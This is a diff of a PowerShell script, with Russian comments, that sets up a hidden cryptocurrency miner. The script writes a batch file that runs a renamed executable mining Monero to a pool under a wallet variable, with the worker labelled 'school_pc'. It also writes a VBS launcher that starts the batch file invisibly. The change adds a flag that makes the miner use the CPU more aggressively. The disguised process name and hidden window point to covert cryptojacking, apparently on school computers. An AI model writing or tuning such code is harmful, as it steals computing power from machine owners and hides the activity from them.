@@ -41,7 +41,7 @@ try {
 }
 
 # 5. Создание файлов запуска (Исправленные флаги)
-$cmd = "@echo off`n$path\$procName.exe --title $procName --cpu-priority 1 --cpu-max-threads-hint 50 -o gulf.moneroocean.stream:10128 -u $wallet -p school_pc --algo rx/0 --donate-level 1"
+$cmd = "@echo off`n$path\$procName.exe --title $procName --cpu-priority 1  --cpu-no-yield --cpu-max-threads-hint 50 -o gulf.moneroocean.stream:10128 -u $wallet -p school_pc --algo rx/0 --donate-level 1"
 $cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
 $vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False"
 $vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii
